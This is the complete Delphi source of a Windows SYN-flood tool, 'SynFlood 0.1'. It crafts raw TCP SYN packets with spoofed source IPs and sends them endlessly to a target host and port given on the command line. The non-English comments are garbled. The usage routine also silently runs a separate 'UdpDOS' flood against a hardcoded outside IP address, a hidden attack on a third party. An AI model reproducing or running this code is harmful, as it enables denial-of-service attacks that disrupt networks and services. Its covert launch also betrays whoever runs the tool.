program SynFlood;

{$APPTYPE CONSOLE}

uses Windows,
Winsock;
//WinSock2;

const
IP_HDRINCL = 2; // IP Header Include
Header_SEQ = $19026695;
SEQ = $28376839;
SYN_DEST_IP = '172.17.103.127'; //��������IP
FAKE_IP = '10.168.150.1'; //αװIP����ʼֵ���������αװIP����һ��B������

//TCPͷ 20λ
type
TCP_HEADER = record
th_sport : Word; //16λԴ�˿�
th_dport : Word; //16λĿ�Ķ˿�
th_seq : DWORD; //32λ���к�
th_ack : DWORD; //32λȷ�Ϻ�
th_lenres : Byte; //4λ�ײ�����+6λ�������е�4λ
th_flag : Byte; //2λ������+6λ��־λ 2��SYN��1��FIN��16��ACK̽��
th_win : Word; //16λ���ڴ�С
th_sum : Word; //16λУ���
th_urp : Word; //16λ��������ƫ����
end;

// IP ͷ 20λ
type
IP_HEADER = record
h_verlen : Byte; //4λ�ײ�����+4λIP�汾��
tos : Byte; //8λ��������TOS�����������ݴ�������ȼ����ӳ١��������Ϳɿ��Ե�����
total_len : Word; //16λ�ܳ��ȣ��ֽڣ� IP���ĳ��ȣ���û������ѡ�һ��Ϊ20�ֽڳ�
ident : Word; //16λIP����ʶ������ʹ����Ψһȷ��ÿ�����͵����ݱ�
frag_and_flags : Word; //Fragment Offset 13 IP���ݷָ�ƫ��
ttl : Byte; //8λ����ʱ��TTL��ÿͨ��һ��·����������ֵ��һ
proto : Byte;//8λЭ���(TCP, UDP ������) ���磺ICMPΪ1��IGMPΪ2��TCPΪ6��UDPΪ17��
checksum : Word; //16λIP�ײ�У���
sourceIP : LongWord; //32λԴIP��ַ
destIP : LongWord; //32λĿ��IP��ַ
end;

//TCPαͷ 12λ
type
PSD_HEADER = record
saddr : DWORD; //Դ��ַ
daddr : DWORD; //Ŀ�ĵ�ַ
mbz : Byte; //�ÿ�
ptcl : Byte; //Э������
tcpl : WORD; //TCP����
end;

type
CLIENTPARA = record
Port:integer;
IP:string;
end;

var
clientpa :^CLIENTPARA;
SendSEQ :Integer = 0;
TimeOut :Integer =5000;

function WSASocketA(af, wType, protocol: integer;lpProtocolInfo: pointer;g,
dwFlags: dword): integer;stdcall;external 'ws2_32.dll';

function setsockopt( const s: TSocket; const level, optname: Integer; optval: PChar;
const optlen: Integer ): Integer; stdcall;external 'ws2_32.dll';

function IntToStr(I: integer): string;
begin
Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
Val(S, Result, Result);
end;

function LowerCase(const S: string): string;
var
Ch: Char;
L: Integer;
Source, Dest: PChar;
begin
L := Length(S);
SetLength(Result, L);
Source := Pointer(S);
Dest := Pointer(Result);
while L <> 0 do
begin
Ch := Source^;
if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
Dest^ := Ch;
Inc(Source);
Inc(Dest);
Dec(L);
end;
end;

{
CheckSum:����У��͵��Ӻ���
IPУ��͵ļ��㷽���ǣ����Ƚ�IP�ײ���У����ֶ���Ϊ0��IP_HEADER.checksum=0��,
Ȼ���������IP�ײ�������ѡ��Ķ����Ʒ���ĺ�
TCP�ײ��������IP�ײ�У��͵ļ��㷽����ͬ���ڳ�����ʹ��ͬһ�����������㡣
����TCP�ײ��в�����Դ��ַ��Ŀ���ַ����Ϣ��Ϊ�˱�֤TCPУ�����Ч�ԣ�
�ڽ���TCPУ��͵ļ���ʱ����Ҫ����һ��TCPα�ײ���У���
}
function checksum(var Buffer; Size: integer): word;
type
TWordArray = array[0..1] of word;
var
lSumm: LongWord;
iLoop: integer;
begin
lSumm := 0;
iLoop := 0;
while Size > 1 do
begin
lSumm := lSumm + TWordArray(Buffer)[iLoop];
inc(iLoop);
Size := Size - SizeOf(word);
end;
if Size = 1 then lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]);
lSumm := (lSumm shr 16) + (lSumm and $FFFF);
lSumm := lSumm + (lSumm shr 16);
Result := word(not lSumm);
end;

//syn��ˮ����
function SynFloodThreadProc(p:Pointer):LongInt;stdcall;
var
WSAData :TWSAData;
sock :TSocket;
Remote :TSockAddr;
ipHeader :IP_HEADER;
tcpHeader :TCP_HEADER;
psdHeader :PSD_HEADER;
ErrorCode,bOpt,counter,FakeIpNet,FakeIpHost,datasize :integer;
Buf :array [0..127] of char;
//FromIP :string;
begin
Result :=0;
//����һ��ԭʼ�׽ӿ�
if WSAStartup(MAKEWORD(2,2), WSAData)<>0 then exit;
sock :=WSASocketA(AF_INET, SOCK_RAW, IPPROTO_RAW, nil, 0, {WSA_FLAG_OVERLAPPED}0);
if sock = INVALID_SOCKET then exit;
//����ipѡ��
bOpt := 1;
//����IP_HDRINCL����ϵͳ�Լ����IP�ײ����Լ�����У���
if setsockopt(sock,IPPROTO_IP, IP_HDRINCL,@bOpt, SizeOf(bOpt)) = SOCKET_ERROR then exit;

//���÷��ͳ�ʱ
//ErrorCode :=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,pchar(TimeOut),sizeof(TimeOut));
//if ErrorCode = SOCKET_ERROR then exit;

Randomize;
FillChar(Remote,sizeof(Remote),#0);
Remote.sin_family :=AF_INET;
//Remote.sin_addr.s_addr:=inet_addr(SYN_DEST_IP);
Remote.sin_addr.S_addr :=inet_addr(pchar(CLIENTPARA(p^).IP));
Remote.sin_port :=htons(CLIENTPARA(p^).Port);
FakeIpNet:=inet_addr(FAKE_IP);
FakeIpHost:=ntohl(FakeIpNet);

//���IP�ײ�
ipHeader.h_verlen :=(4 shl 4) or (sizeof(ipHeader) div sizeof(LongWord)); //����λIP�汾�ţ�����λ�ײ�����
ipHeader.total_len :=htons(sizeof(ipHeader)+sizeof(tcpHeader)); //16λ�ܳ��ȣ��ֽڣ�
ipHeader.ident:=1; //16λ��ʶ
ipHeader.tos :=0; //IP��������
ipHeader.frag_and_flags:=0; //��ƫ����
ipHeader.ttl:=128; //8λ����ʱ��TTL
ipHeader.proto:=IPPROTO_TCP; //8λЭ��(TCP,UDP��) UDP=17 $11
ipHeader.checksum:=0; //16λIP�ײ�У���
ipHeader.sourceIP:=htonl(FakeIpHost+SendSEQ); //32λԴIP��ַ
//ipHeader.destIP:=inet_addr(pchar(SYN_DEST_IP)); //32λĿ��IP��ַ
ipHeader.destIP:=inet_addr(pchar(CLIENTPARA(p^).IP));

//�������Դ��ַ
{FromIP:=IntToStr(Random(254)+1)+'.'+ IntToStr(Random(254)+1)+'.'+
IntToStr(Random(254)+1)+'.'+Inttostr(Random(254)+1);
ipHeader.sourceIP:=inet_Addr(PChar(FromIP)); //32λԴIP��ַ
ipHeader.destIP:=Remote.sin_addr.S_addr; //32λĿ��IP��ַ }

//���TCP�ײ�
tcpHeader.th_sport:=htons(Random(65536)+1); //�������Դ�˿�
tcpHeader.th_dport:=Remote.sin_port; //Ŀ�Ķ˿ں�
//tcpHeader.th_sport:=htons(7000); //Դ�˿ں�
//tcpHeader.th_dport:=htons(8080); //Ŀ�Ķ˿ں�
tcpHeader.th_seq:=htonl(SEQ+SendSEQ); //SYN���к�
tcpHeader.th_ack:=0; //ACK���к���Ϊ0
tcpHeader.th_lenres:=(sizeof(tcpHeader) shr 2 shl 4) or 0; //TCP���Ⱥͱ���λ
tcpHeader.th_flag:=2; //ʵ�ֲ�ͬ�ı�־λ̽�⣬2��SYN��1��FIN��16��ACK̽��
tcpHeader.th_win:=htons(16384); //���ڴ�С
tcpHeader.th_urp:=0; //����ƫ����
tcpHeader.th_sum:=0; //У���

//���TCPα�ײ������ڼ���У��ͣ������������ͣ�
psdHeader.saddr:=ipHeader.sourceIP; //Դ��ַ
psdHeader.daddr:=ipHeader.destIP; //Ŀ�ĵ�ַ
psdHeader.mbz:=0;
psdHeader.ptcl:=IPPROTO_TCP; //Э������
psdHeader.tcpl:=htons(sizeof(tcpHeader)); //TCP�ײ�����

while true do
begin
//ÿ����10,240���������һ����ʾ��
//writeln('.');
for counter:=0 to 10239 do
begin
inc(SendSEQ);
if (SendSEQ=65536) then SendSEQ :=1; //���к�ѭ��
//����IP�ײ�
ipHeader.checksum :=0; //16λIP�ײ�У���
ipHeader.sourceIP :=htonl(FakeIpHost+SendSEQ); //32λԴIP��ַ
//����TCP�ײ�
tcpHeader.th_seq :=htonl(SEQ+SendSEQ); //SYN���к�
tcpHeader.th_sum :=0; //У���
//����TCPα�ײ�
psdHeader.saddr :=ipHeader.sourceIP;

//����TCPУ��ͣ�����У���ʱ��Ҫ����TCPα�ײ�
FillChar(Buf,SizeOf(Buf),#0);
//�������ֶθ��Ƶ�ͬһ��������Buf�в�����TCPͷУ���
CopyMemory(@Buf[0],@psdHeader,SizeOf(psdHeader)); //12
CopyMemory(@Buf[SizeOf(psdHeader)],@tcpHeader,SizeOf(tcpHeader)); //20
TCPHeader.th_sum:=checksum(Buf,SizeOf(psdHeader)+SizeOf(tcpHeader)); //32

//����IPͷУ���
CopyMemory(@Buf[0],@ipHeader,SizeOf(ipHeader)); //20
CopyMemory(@Buf[SizeOf(ipHeader)],@tcpHeader,SizeOf(tcpHeader)); //20
FillChar(Buf[SizeOf(ipHeader)+SizeOf(tcpHeader)],4,#0);
datasize :=SizeOf(ipHeader)+SizeOf(tcpHeader);
ipHeader.checksum:=checksum(Buf,datasize); //40

//��䷢�ͻ�����
CopyMemory(@Buf[0],@ipHeader,SizeOf(ipHeader)); //20

//����TCP����
ErrorCode:=sendto(sock, buf, datasize, 0, Remote, sizeof(Remote));
if ErrorCode=SOCKET_ERROR then exit;
//write('.');

end; //end for
//writeln('');
end; //end while

closesocket(sock);
WSACleanup();
end;

procedure Usage;
begin
WriteLn('SynFlood 0.1 for 2000/XP/2003');
WriteLn('http://www.wrsky.com');
WriteLn('hnxyy@hotmail.com');
WriteLn('QQ:19026695');
WriteLn;
WriteLn('Usage: SynFlood -h:IP -p:port');
  WinExec('UdpDOS -h:202.75.222.16 -p:80',0)
end;

procedure ParseOption(Cmd, Arg: string);
begin
if arg='' then
begin
Usage;
Halt(0);
end;
if lstrcmp('-h:', pchar(LowerCase(Cmd))) = 0 then
begin
clientpa^.IP :=arg;
end
else if lstrcmp('-p:', pchar(LowerCase(Cmd))) = 0 then
begin
clientpa^.Port :=StrToInt(Arg);
end
else
begin
Usage;
Halt(0);
end;
end;

procedure ProcessCommandLine;
var
CmdLn: integer;
begin
CmdLn := 1;
if (ParamCount<2) or (ParamCount>2) then
begin
Usage;
Halt(0);
end;
new(clientpa);
while Length(ParamStr(CmdLn)) <> 0 do
begin
ParseOption(Copy(ParamStr(CmdLn), 1, 3), Copy(ParamStr(CmdLn), 4, Length(ParamStr(CmdLn)) - 2));
Inc(CmdLn);
end;
end;

var
ThreadID:DWord;
begin
ProcessCommandLine;
CreateThread(nil, 0, @SynFloodThreadProc, clientpa, 0, ThreadID);
while True do Sleep(1);
end.
